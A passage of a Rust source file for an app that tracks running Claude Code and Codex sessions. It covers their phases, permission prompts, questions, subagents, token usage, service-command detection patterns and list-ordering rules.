// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Vorssaint

//! What the Sessions section knows about running Claude Code sessions, ported
//! from `ClaudeSessionModels.swift`, with the island's order and doze rules
//! from `NotchClaudeSessionsSupport.swift`. Everything the UI receives
//! serializes to camelCase JSON; times are epoch seconds.

use std::cmp::Ordering;
use std::collections::hash_map::DefaultHasher;
use std::hash::{Hash, Hasher};
use std::sync::LazyLock;

use regex::{Regex, RegexSet};
use serde::Serialize;
use serde::ser::SerializeStruct;
use serde_json::{Map, Value};
use unicode_segmentation::UnicodeSegmentation;

/// Seconds since 1970, as every time here is kept.
pub type Time = f64;

/// Foundation's `Date.distantPast` (year 1), for comparisons against a time
/// that is not known. Finite, so it still serializes.
pub const DISTANT_PAST: Time = -62_135_769_600.0;

// MARK: Phases

/// Where a running Claude Code session is in its work, as the Sessions
/// section shows it.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum SessionPhase {
    /// Writing a reply or thinking.
    Generating,
    /// A tool the model called is running, like a shell command.
    RunningTool,
    /// A tool waits for the person to allow it.
    WaitingPermission,
    /// A question, dialog or other prompt waits for the person.
    WaitingInput,
    /// The turn ended but a command it started, like a render, or a subagent
    /// it sent off still runs in the background; Claude Code hears when it ends.
    Background,
    /// The plan's usage limit stopped the turn; it goes on, by itself or
    /// with a prompt, once the limit resets.
    Limited,
    /// The turn ended and the person has not looked at it yet.
    Finished,
    Idle,
}

impl SessionPhase {
    pub fn is_working(self) -> bool {
        matches!(self, Self::Generating | Self::RunningTool)
    }

    /// Work goes on, in the turn or behind it.
    pub fn is_active(self) -> bool {
        self.is_working() || self == Self::Background
    }

    pub fn is_waiting(self) -> bool {
        matches!(self, Self::WaitingPermission | Self::WaitingInput)
    }

    /// Where the phase sorts in the list: whatever waits on the person first.
    pub fn rank(self) -> u8 {
        match self {
            Self::WaitingPermission => 0,
            Self::WaitingInput => 1,
            Self::RunningTool | Self::Generating => 2,
            Self::Limited => 3,
            Self::Background => 4,
            Self::Finished => 5,
            Self::Idle => 6,
        }
    }
}

/// The plan window that ran out, when the agent says which.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum LimitKind {
    Session,
    Weekly,
    Other,
}

impl LimitKind {
    /// The window Claude Code names in `rateLimitType`.
    pub fn of_claude(raw: Option<&str>) -> Option<Self> {
        let raw = raw?;
        Some(if raw == "five_hour" {
            Self::Session
        } else if raw.starts_with("seven_day") {
            Self::Weekly
        } else {
            Self::Other
        })
    }
}

/// A turn the plan's usage limit stopped, as the agent recorded it.
#[derive(Clone, Copy, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LimitStop {
    /// When the agent hit the limit.
    pub at: Time,
    /// When the limit lifts, when the agent said; otherwise the limits
    /// reading tells.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub resets_at: Option<Time>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub kind: Option<LimitKind>,
}

impl LimitStop {
    /// How long a stop with no known reset stays shown: a session window.
    pub const UNKNOWN_RESET_HOLD: Time = 5.0 * 3600.0;

    /// Whether the stop still holds at `now`: until the limit resets.
    pub fn holds(&self, now: Time) -> bool {
        now < self.resets_at.unwrap_or(self.at + Self::UNKNOWN_RESET_HOLD)
    }
}

/// The state a session writes to `~/.claude/sessions/<pid>.json`.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum RegistryStatus {
    Idle,
    Busy,
    Waiting,
    Shell,
}

impl RegistryStatus {
    /// Nil for a status this build does not know, which leaves the
    /// transcript to decide.
    pub fn from_raw(raw: &str) -> Option<Self> {
        match raw {
            "idle" => Some(Self::Idle),
            "busy" => Some(Self::Busy),
            "waiting" => Some(Self::Waiting),
            "shell" => Some(Self::Shell),
            _ => None,
        }
    }
}

/// The app showing a session's terminal. On the Mac this held Terminal's tty
/// or Antigravity's port; on Windows the service finds the host from the
/// process tree and keeps whatever it needs to reach it on its own side.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum HostKind {
    WindowsTerminal,
    Vscode,
    Conhost,
    App,
    /// No terminal at all: a whole session running in the background.
    Background,
    #[default]
    Unknown,
}

/// One running session, read from Claude Code's own registry of processes.
#[derive(Clone, Debug, PartialEq)]
pub struct SessionRecord {
    pub pid: i32,
    pub session_id: String,
    pub cwd: String,
    pub name: String,
    pub status: Option<RegistryStatus>,
    /// Why a waiting session waits, like "permission prompt" or "input needed".
    pub waiting_for: Option<String>,
    /// When `status` last changed.
    pub status_updated: Option<Time>,
    pub started: Option<Time>,
    pub version: String,
    /// Set by the service once it has found the terminal holding the session.
    pub host: HostKind,
    /// Whether a reply can be typed into that host; the service decides.
    pub accepts_replies: bool,
    /// Where `name` came from: "user" for /rename, "auto" for one Claude
    /// Code made from the conversation; otherwise it follows the folder.
    pub name_source: Option<String>,
    /// The job a background session goes by; None for one in a terminal.
    pub job: Option<String>,
}

impl SessionRecord {
    pub const PERMISSION_PROMPT: &'static str = "permission prompt";
    /// Any dialog in the terminal, including one the person opened, like
    /// /usage or /config.
    pub const DIALOG_OPEN: &'static str = "dialog open";
}

// MARK: Tools and permissions

#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ToolUse {
    pub id: String,
    pub name: String,
    /// A short reading of what the tool works on, like a command or a file
    /// name; nil unless content previews are on.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub summary: Option<String>,
    pub started: Time,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub finished: Option<Time>,
    pub failed: bool,
    /// Tells this call apart from another of the same tool by what it was
    /// given, without keeping what it was given.
    #[serde(skip)]
    pub input_key: Option<u64>,
}

impl ToolUse {
    pub fn new(id: &str, name: &str, summary: Option<String>, started: Time) -> Self {
        Self {
            id: id.to_owned(),
            name: name.to_owned(),
            summary,
            started,
            finished: None,
            failed: false,
            input_key: None,
        }
    }

    pub fn is_running(&self) -> bool {
        self.finished.is_none()
    }
}

/// A tool waiting for the person's permission, asked of the island by the hook.
#[derive(Clone, Debug, PartialEq)]
pub struct Permission {
    pub request_id: String,
    pub tool: String,
    /// One line on what the tool would do, for the list and notices.
    pub summary: Option<String>,
    /// Everything the tool would do: the whole command, path or arguments.
    /// Shown even with previews off, since nobody should allow what they
    /// cannot read, and dropped once answered.
    pub detail: String,
    /// Claude Code offered rules that would stop it asking again.
    pub offers_always: bool,
    pub since: Time,
    /// The tool call the request is for; its result answers it. Empty for a
    /// subagent's, whose tools are not followed.
    pub tool_id: Option<String>,
    /// Matches the tool call whose input this is.
    pub input_key: Option<u64>,
    /// What Claude asks the person to choose, when the request is for a
    /// question rather than a tool; it is answered, not allowed.
    pub questions: Vec<Question>,
}

impl Permission {
    pub fn new(
        request_id: &str,
        tool: &str,
        summary: Option<&str>,
        offers_always: bool,
        since: Time,
    ) -> Self {
        Self {
            request_id: request_id.to_owned(),
            tool: tool.to_owned(),
            summary: summary.map(str::to_owned),
            detail: String::new(),
            offers_always,
            since,
            tool_id: None,
            input_key: None,
            questions: Vec::new(),
        }
    }

    pub fn asks_questions(&self) -> bool {
        !self.questions.is_empty()
    }

    /// A request short enough to read whole on one line of the list. A
    /// `\r\n` counts as a line break here; Swift's Character-wise `contains`
    /// missed it, which Windows commands would hit.
    pub fn fits_on_a_line(&self) -> bool {
        !self.asks_questions()
            && !self.detail.contains('\n')
            && char_count(&self.detail) <= QUICK_DECISION_LIMIT
    }
}

impl Serialize for Permission {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        let mut out = serializer.serialize_struct("Permission", 9)?;
        out.serialize_field("requestId", &self.request_id)?;
        out.serialize_field("tool", &self.tool)?;
        match &self.summary {
            Some(summary) => out.serialize_field("summary", summary)?,
            None => out.skip_field("summary")?,
        }
        out.serialize_field("detail", &self.detail)?;
        out.serialize_field("offersAlways", &self.offers_always)?;
        out.serialize_field("since", &self.since)?;
        out.serialize_field("questions", &self.questions)?;
        // Worked out here, where the character count matches the Mac's.
        out.serialize_field("asksQuestions", &self.asks_questions())?;
        out.serialize_field("fitsOnALine", &self.fits_on_a_line())?;
        out.end()
    }
}

/// One question Claude asks through AskUserQuestion, with the answers it
/// wrote for it. Shown even with previews off, like a permission's detail:
/// nobody can answer what they cannot read.
#[derive(Clone, Debug, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Question {
    pub question: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub header: Option<String>,
    pub options: Vec<QuestionOption>,
    pub multi_select: bool,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct QuestionOption {
    pub label: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// A mockup or snippet the option stands for, shown once it is picked.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub preview: Option<String>,
}

impl QuestionOption {
    pub fn new(label: &str) -> Self {
        Self {
            label: label.to_owned(),
            ..Self::default()
        }
    }
}

impl Question {
    pub const TOOL: &'static str = "AskUserQuestion";
    /// Claude Code takes at most four questions of four options each, and
    /// refuses answers longer than 32,768 UTF-16 units in all; each answer
    /// written by hand keeps to a share of that, leaving room for the choices.
    pub const OWN_ANSWER_LIMIT: usize = 7_500;

    /// The questions of the tool's input, or nil when it holds none that
    /// can be shown.
    pub fn questions_in(input: &Map<String, Value>) -> Option<Vec<Question>> {
        let list = input.get("questions")?.as_array()?;
        // `as? [[String: Any]]`: one item that is not an object spoils the list.
        if !list.iter().all(Value::is_object) {
            return None;
        }
        let questions: Vec<Question> = list
            .iter()
            .filter_map(Value::as_object)
            .filter_map(|item| {
                let text = str_of(item.get("question"))?;
                if trim(text).is_empty() {
                    return None;
                }
                let options = dicts(item.get("options"))
                    .into_iter()
                    .filter_map(|option| {
                        let label = str_of(option.get("label")).filter(|l| !l.is_empty())?;
                        Some(QuestionOption {
                            label: label.to_owned(),
                            description: non_empty(option.get("description")),
                            preview: non_empty(option.get("preview")),
                        })
                    })
                    .collect();
                Some(Question {
                    question: text.to_owned(),
                    header: non_empty(item.get("header")),
                    options,
                    multi_select: item
                        .get("multiSelect")
                        .and_then(Value::as_bool)
                        .unwrap_or(false),
                })
            })
            .collect();
        // Every question needs an answer Claude Code can match to it.
        (!questions.is_empty() && questions.len() == list.len()).then_some(questions)
    }
}

// MARK: Subagents, tasks, usage

#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Subagent {
    pub id: String,
    #[serde(rename = "type")]
    pub agent_type: String,
    /// The task it was given; nil unless content previews are on.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    pub started: Time,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub finished: Option<Time>,
    /// The color its definition gives it in Claude Code, as written there.
    /// Filled in by the service, which reads the definitions.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub color: Option<String>,
}

impl Subagent {
    /// The type of a subagent whose own description was not read yet.
    pub const UNTYPED: &'static str = "Agent";

    pub fn new(id: &str, agent_type: &str, started: Time) -> Self {
        Self {
            id: id.to_owned(),
            agent_type: agent_type.to_owned(),
            description: None,
            started,
            finished: None,
            color: None,
        }
    }

    pub fn is_running(&self) -> bool {
        self.finished.is_none()
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskProgress {
    pub done: i64,
    pub total: i64,
    /// The task under way; nil unless content previews are on.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub current: Option<String>,
}

impl TaskProgress {
    pub fn fraction(&self) -> f64 {
        if self.total > 0 {
            self.done as f64 / self.total as f64
        } else {
            0.0
        }
    }
}

/// Token counts in the shape every log reduces to. `input` excludes cache
/// traffic, and `output` already contains the reasoning tokens.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Tokens {
    pub input: i64,
    pub cache_write: i64,
    pub cache_read: i64,
    pub output: i64,
    pub reasoning: i64,
}

impl Tokens {
    pub fn total(&self) -> i64 {
        self.input + self.cache_write + self.cache_read + self.output
    }

    /// Everything the model read, cached or not.
    pub fn prompt(&self) -> i64 {
        self.input + self.cache_write + self.cache_read
    }

    /// Streamed replies are logged once per content block, and the earlier
    /// blocks carry the output counted so far. The largest reading is final.
    pub fn merged(&self, other: &Tokens) -> Tokens {
        Tokens {
            input: self.input.max(other.input),
            cache_write: self.cache_write.max(other.cache_write),
            cache_read: self.cache_read.max(other.cache_read),
            output: self.output.max(other.output),
            reasoning: self.reasoning.max(other.reasoning),
        }
    }
}

impl std::ops::AddAssign for Tokens {
    fn add_assign(&mut self, other: Tokens) {
        self.input += other.input;
        self.cache_write += other.cache_write;
        self.cache_read += other.cache_read;
        self.output += other.output;
        self.reasoning += other.reasoning;
    }
}

/// One message of a session's conversation.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ChatMessage {
    pub id: i64,
    pub role: ChatRole,
    pub text: String,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    pub images: Vec<String>,
    pub at: Time,
    /// The reply the turn ended on, which answers what was asked; the
    /// replies before it tell of the work on the way.
    pub ends_turn: bool,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum ChatRole {
    User,
    Assistant,
}

// MARK: Session

/// Everything the island shows about one session.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Session {
    pub id: String,
    /// Which agent runs it: Claude Code or Codex.
    pub provider: Provider,
    pub pid: i32,
    pub cwd: String,
    pub project: String,
    /// Claude Code's name for the session.
    pub name: String,
    /// Where that name came from, as the registry says.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name_source: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub branch: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    /// A readable model name; the engine leaves it to the service, which
    /// has the pricing table.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub model_name: Option<String>,
    pub host: HostKind,
    pub accepts_replies: bool,
    pub phase: SessionPhase,
    pub phase_since: Time,
    /// When the turn under way, or the last one, began.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub turn_started: Option<Time>,
    /// When the session last did anything, for a steady order among quiet ones.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_active: Option<Time>,
    /// When the person last opened its page.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub looked_at: Option<Time>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub waiting_for: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub current_tool: Option<ToolUse>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub permission: Option<Permission>,
    /// The latest tools of the main agent, oldest first.
    pub timeline: Vec<ToolUse>,
    pub subagents: Vec<Subagent>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tasks: Option<TaskProgress>,
    pub tokens: Tokens,
    pub cost: f64,
    /// Gated by content previews.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub title: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_text: Option<String>,
    /// The hooks report this session, so permissions can be answered here.
    pub hooked: bool,
    /// What was typed and answered, oldest first; gated by content previews.
    pub chat: Vec<ChatMessage>,
    /// What a session in the background waits on; gated by content previews.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub background_label: Option<String>,
    /// Services it left running, like a dev server, which never end alone.
    pub services: i64,
    /// Set for a whole session running in the background, with no terminal.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub background: Option<super::background::BackgroundDetails>,
    /// Why the session stopped, while `phase` is `Limited`.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub limit_stop: Option<LimitStop>,
}

#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SessionCounts {
    pub working: i64,
    /// Of `working`, the Codex ones: each agent shows its own mark and color.
    pub working_codex: i64,
    pub waiting: i64,
    /// Stopped by the plan's usage limit.
    pub limited: i64,
    pub finished: i64,
}

impl SessionCounts {
    pub fn of(sessions: &[Session]) -> Self {
        let mut counts = Self::default();
        for session in sessions {
            if session.phase.is_active() {
                counts.working += 1;
                if session.provider == Provider::Codex {
                    counts.working_codex += 1;
                }
            }
            if session.phase.is_waiting() {
                counts.waiting += 1;
            }
            if session.phase == SessionPhase::Limited {
                counts.limited += 1;
            }
            if session.phase == SessionPhase::Finished {
                counts.finished += 1;
            }
        }
        counts
    }

    pub fn is_empty(&self) -> bool {
        self.working + self.waiting + self.limited + self.finished == 0
    }
}

/// The agent behind a session; each has its own figure and its own channel.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Hash, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum Provider {
    #[default]
    Claude,
    Codex,
}

/// A change worth a notice in the island.
#[derive(Clone, Debug, PartialEq, Serialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum SessionEvent {
    NeedsPermission {
        id: String,
        tool: String,
    },
    NeedsInput {
        id: String,
    },
    Finished {
        id: String,
        #[serde(skip_serializing_if = "Option::is_none")]
        duration: Option<f64>,
    },
}

/// Whether what sessions say and do may be decoded for the island.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub struct ContentPolicy {
    pub previews: bool,
}

// MARK: Facts

/// What one transcript line tells about its session. Text, titles and tool
/// arguments appear only when the content policy allows them.
#[derive(Clone, Debug, PartialEq)]
pub enum TranscriptFact {
    TurnBegan(Time),
    TurnEnded {
        at: Time,
        completed: bool,
    },
    ToolStarted(ToolUse),
    ToolFinished {
        id: String,
        at: Time,
        failed: bool,
    },
    /// What the model wrote; the text a turn ends on ends that turn.
    Text {
        text: String,
        at: Time,
        ends_turn: bool,
    },
    /// A prompt the person typed, read only when previews are allowed.
    Prompt {
        text: String,
        at: Time,
    },
    PromptImages {
        images: Vec<String>,
        at: Time,
    },
    Title(String),
    Branch(String),
    Model(String),
    /// Streamed replies repeat their usage per block; the key merges them.
    Usage {
        key: String,
        tokens: Tokens,
        cost: f64,
    },
    SubagentActivity {
        id: String,
        at: Time,
    },
    SubagentEnded {
        id: String,
        at: Time,
    },
    /// A command the model left running in the background, or a subagent it
    /// sent there; a service, like a dev server or an emulator, is meant to
    /// keep running.
    BackgroundStarted {
        tool_id: String,
        service: bool,
        label: Option<String>,
        at: Time,
    },
    /// The id Claude Code gave that command or subagent, which its end notice names.
    BackgroundTask {
        tool_id: String,
        task: String,
    },
    SubagentInfo {
        id: String,
        agent_type: String,
        description: Option<String>,
    },
    Tasks(TaskProgress),
    /// The plan's usage limit stopped the turn.
    LimitReached(LimitStop),
}

/// One hook event Claude Code sent while the session ran.
#[derive(Clone, Debug, PartialEq)]
pub struct HookFact {
    pub session_id: String,
    pub date: Time,
    pub event: HookEvent,
    /// The subagent the event comes from; nil for the main agent.
    pub agent_id: Option<String>,
}

#[derive(Clone, Debug, PartialEq)]
pub enum HookEvent {
    SessionStarted,
    SessionEnded,
    PromptSubmitted,
    ToolStarted(ToolUse),
    ToolFinished { id: String, failed: bool },
    PermissionRequested(Permission),
    Notification { kind: String },
    Stopped { last_text: Option<String> },
    SubagentStarted { id: String, agent_type: String },
    SubagentStopped { id: String },
    Other(String),
}

// MARK: Background commands

/// Tells a background command that is meant to keep running, like a dev
/// server, a watcher or an emulator, from one whose end Claude waits for,
/// like a render, a build or a pause.
pub mod background_kind {
    use super::*;

    /// The Mac's patterns, verbatim, case-insensitive. The docker one ends in
    /// a lookahead the `regex` crate lacks, so it is matched by hand below.
    pub const SERVICE_PATTERNS: &[&str] = &[
        r"\b(serve|server|servers|serving)\b",
        r"\bbackend\b",
        r"\b(dev|devserver)\s*server\b",
        r"\b(npm|yarn|pnpm|bun)\s+(run\s+)?(dev|start|serve|watch|preview)\b",
        r"\bexpo\s+start\b",
        r"\bmetro\b",
        r"\bvite\b",
        r"\bnext\s+dev\b",
        r"\bconvex\s+dev\b",
        r"\bwebpack(-dev-server|\s+serve)\b",
        r"\bstorybook\b",
        r"http\.server",
        r"--watch\b",
        r"\bwatch(ing|er)?\b",
        r"\btail\s+-[a-z]*f",
        r"\blogcat\b",
        r"\bemulator\b",
        r"\bsimulator\b",
        r"simctl\s+boot",
        r"\bngrok\b",
        r"\btunnel\b",
        r"\bnodemon\b",
        r"\buvicorn\b",
        r"\bflask\s+run\b",
        r"\brails\s+s(erver)?\b",
        r"\blisten(s|ing)?\b",
    ];

    static SERVICES: LazyLock<RegexSet> = LazyLock::new(|| {
        RegexSet::new(SERVICE_PATTERNS.iter().map(|p| format!("(?i){p}")))
            .expect("service patterns")
    });
    /// `\bdocker\s+compose\s+up\b(?!.*\s-d\b)`, without its lookahead.
    static DOCKER_UP: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?i)\bdocker\s+compose\s+up\b").expect("docker pattern"));
    /// What the lookahead refuses: a whitespace, then `-d` as a whole word.
    static DETACHED: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"(?i)^\s-d\b").expect("detach pattern"));

    pub fn is_service(command: &str, description: Option<&str>) -> bool {
        let text = format!("{}\n{command}", description.unwrap_or(""));
        SERVICES.is_match(&text) || docker_up_attached(&text)
    }

    /// `docker compose up` left in the foreground. As in the Mac's ICU
    /// pattern, `.*` stops at a line break, while the `\s` after it may be
    /// that line break, so `-d` counts on the rest of the line or at the
    /// start of the next.
    fn docker_up_attached(text: &str) -> bool {
        DOCKER_UP.find_iter(text).any(|found| {
            let rest = &text[found.end()..];
            let line = rest
                .find([
                    '\n', '\u{0B}', '\u{0C}', '\r', '\u{85}', '\u{2028}', '\u{2029}',
                ])
                .map_or(rest.len(), |n| n + 1);
            let detached = rest
                .char_indices()
                .take_while(|(index, _)| *index < line)
                .any(|(index, _)| DETACHED.is_match(&rest[index..]));
            !detached
        })
    }
}

// MARK: Tool summaries

/// One-line readings of a tool call, and the whole of what it asks to do.
pub mod tool_summary {
    use super::*;

    pub const LIMIT: usize = 80;
    pub const QUICK_DECISION_LIMIT: usize = 60;
    pub const DETAIL_LIMIT: usize = 8000;
    /// The tool Claude Code calls to have its plan approved.
    pub const PLAN_TOOL: &str = "ExitPlanMode";

    /// A one-line reading of a tool call, built only from the fields that say
    /// what it touches.
    pub fn summary(name: &str, input: &Map<String, Value>) -> Option<String> {
        let text = |key: &str| -> Option<String> {
            let value = str_of(input.get(key))?;
            // Swift's `split` drops empty pieces, so leading line breaks go.
            let line = value
                .split(is_newline)
                .find(|piece| !piece.is_empty())
                .unwrap_or("");
            let trimmed = trim(line);
            (!trimmed.is_empty()).then(|| clip(trimmed))
        };
        match name {
            "Bash" => text("command"),
            "Read" | "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => text("file_path")
                .or_else(|| text("notebook_path"))
                .map(|path| last_path_component(&path)),
            "Grep" | "Glob" => text("pattern"),
            "WebFetch" => str_of(input.get("url"))
                .and_then(url_host)
                .or_else(|| text("url")),
            "WebSearch" => text("query"),
            "Task" | "Agent" => text("description"),
            "Skill" => text("skill"),
            // The plan's first line, its title without the heading marks.
            PLAN_TOOL => text("plan")
                .map(|line| trim(line.trim_start_matches('#')).to_owned())
                .filter(|title| !title.is_empty()),
            _ => text("description"),
        }
    }

    /// The same for the same tool and input within one run of the app. On
    /// the Mac a per-launch `Hasher`; never kept, so any hash will do.
    pub fn input_key(name: &str, input: &Map<String, Value>) -> u64 {
        let mut hasher = DefaultHasher::new();
        name.hash(&mut hasher);
        permission_detail(name, input).hash(&mut hasher);
        hasher.finish()
    }

    /// All of what a tool asks to do, for the person to read before allowing
    /// it: every line of a command, a whole path or address, or each
    /// argument. Only text past `DETAIL_LIMIT` is left out, and that says so.
    pub fn permission_detail(name: &str, input: &Map<String, Value>) -> String {
        let string = |key: &str| str_of(input.get(key)).map(str::to_owned);
        let text = match name {
            "Bash" => string("command").unwrap_or_else(|| arguments(input)),
            "Read" | "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => string("file_path")
                .or_else(|| string("notebook_path"))
                .unwrap_or_else(|| arguments(input)),
            "WebFetch" => string("url").unwrap_or_else(|| arguments(input)),
            PLAN_TOOL => string("plan").unwrap_or_else(|| arguments(input)),
            _ => arguments(input),
        };
        let trimmed = trim(&text);
        let count = char_count(trimmed);
        if count <= DETAIL_LIMIT {
            return trimmed.to_owned();
        }
        format!(
            "{}\n… {} more characters",
            prefix(trimmed, DETAIL_LIMIT),
            count - DETAIL_LIMIT
        )
    }

    /// Each argument on its own line, in a steady order. Values that are not
    /// text read as compact JSON with sorted keys (the Mac printed `1` for
    /// `true` and escaped slashes; JSON reads better and parses the same).
    pub fn arguments(input: &Map<String, Value>) -> String {
        let mut keys: Vec<&String> = input.keys().collect();
        keys.sort();
        keys.iter()
            .map(|key| {
                let shown = match &input[key.as_str()] {
                    Value::String(text) => text.clone(),
                    other => canonical_json(other),
                };
                format!("{key}: {shown}")
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    pub fn clip(text: &str) -> String {
        clip_to(text, LIMIT)
    }
}

pub use tool_summary::QUICK_DECISION_LIMIT;

// MARK: Order, doze and replies

/// Sessions that wait on the person come first, then the ones at work,
/// then work in the background and unread results; quiet sessions follow
/// from the one that worked last, then by folder.
pub fn sorted(mut sessions: Vec<Session>) -> Vec<Session> {
    sessions.sort_by(compare_sessions);
    sessions
}

pub fn compare_sessions(lhs: &Session, rhs: &Session) -> Ordering {
    let (left, right) = (lhs.phase.rank(), rhs.phase.rank());
    if left != right {
        return left.cmp(&right);
    }
    let by_time = match lhs.phase {
        SessionPhase::WaitingPermission | SessionPhase::WaitingInput => {
            time_order(lhs.phase_since, rhs.phase_since)
        }
        SessionPhase::Generating | SessionPhase::RunningTool => time_order(
            lhs.turn_started.unwrap_or(lhs.phase_since),
            rhs.turn_started.unwrap_or(rhs.phase_since),
        ),
        SessionPhase::Limited | SessionPhase::Background | SessionPhase::Finished => {
            time_order(rhs.phase_since, lhs.phase_since)
        }
        // The one that last worked comes first, so a session just looked at
        // does not sink among the long quiet ones.
        SessionPhase::Idle => time_order(
            rhs.last_active.unwrap_or(DISTANT_PAST),
            lhs.last_active.unwrap_or(DISTANT_PAST),
        ),
    };
    if by_time != Ordering::Equal {
        return by_time;
    }
    match standard_compare(&lhs.project, &rhs.project) {
        Ordering::Equal => lhs.pid.cmp(&rhs.pid),
        order => order,
    }
}

/// A total order, so a stray NaN time can never make the sort panic.
fn time_order(a: Time, b: Time) -> Ordering {
    a.total_cmp(&b)
}

/// A stand-in for Foundation's `localizedStandardCompare`, the Finder's
/// order: case-insensitive, with runs of digits compared as numbers. Names
/// equal that way fall back to plain order, so the order stays total.
pub fn standard_compare(a: &str, b: &str) -> Ordering {
    let (mut x, mut y) = (a.chars().peekable(), b.chars().peekable());
    loop {
        match (x.peek().copied(), y.peek().copied()) {
            (None, None) => break,
            (None, Some(_)) => return Ordering::Less,
            (Some(_), None) => return Ordering::Greater,
            (Some(c), Some(d)) if c.is_ascii_digit() && d.is_ascii_digit() => {
                let mut left = String::new();
                while let Some(digit) = x.next_if(char::is_ascii_digit) {
                    left.push(digit);
                }
                let mut right = String::new();
                while let Some(digit) = y.next_if(char::is_ascii_digit) {
                    right.push(digit);
                }
                let (left, right) = (left.trim_start_matches('0'), right.trim_start_matches('0'));
                let order = left.len().cmp(&right.len()).then_with(|| left.cmp(right));
                if order != Ordering::Equal {
                    return order;
                }
            }
            (Some(c), Some(d)) => {
                let order = c.to_lowercase().cmp(d.to_lowercase());
                if order != Ordering::Equal {
                    return order;
                }
                x.next();
                y.next();
            }
        }
    }
    a.cmp(b)
}

/// A quiet session dozes off once it has done nothing this long; before
/// that it stays awake, as after the person reads what it did.
pub const DOZE_AFTER: f64 = 5.0 * 60.0;

/// A session quiet for long: its Clawd sleeps and its row dims. Opening
/// its page counts as something happening, so a result read long after
/// it came is not read beside a sleeping Clawd.
pub fn dozes(session: &Session, now: Time) -> bool {
    if session.phase != SessionPhase::Idle {
        return false;
    }
    let last = session
        .last_active
        .unwrap_or(session.phase_since)
        .max(session.looked_at.unwrap_or(DISTANT_PAST));
    now - last >= DOZE_AFTER
}

/// Keys typed while any dialog is open would go to the dialog.
pub fn can_reply(session: &Session) -> bool {
    // A background session whose process has ended takes none until Open
    // brings it back; `accepts_replies` already says so for it.
    session.accepts_replies && !session.phase.is_waiting() && session.waiting_for.is_none()
}

// MARK: Shared helpers

/// A JSON string value, as Swift's `as? String`.
pub(crate) fn str_of(value: Option<&Value>) -> Option<&str> {
    value.and_then(Value::as_str)
}

/// `as? Bool == true`.
pub(crate) fn is_true(value: Option<&Value>) -> bool {
    value.and_then(Value::as_bool) == Some(true)
}

fn non_empty(value: Option<&Value>) -> Option<String> {
    str_of(value)
        .filter(|text| !text.is_empty())
        .map(str::to_owned)
}

/// `as? [[String: Any]] ?? []`: the objects of an array, or none at all when
/// any item is not an object.
pub(crate) fn dicts(value: Option<&Value>) -> Vec<&Map<String, Value>> {
    match value.and_then(Value::as_array) {
        Some(list) if list.iter().all(Value::is_object) => {
            list.iter().filter_map(Value::as_object).collect()
        }
        _ => Vec::new(),
    }
}

/// A whole number, as `as? Int` reads one from JSON.
pub(crate) fn int_of(value: Option<&Value>) -> Option<i64> {
    let value = value?;
    if let Some(int) = value.as_i64() {
        return Some(int);
    }
    let float = value.as_f64()?;
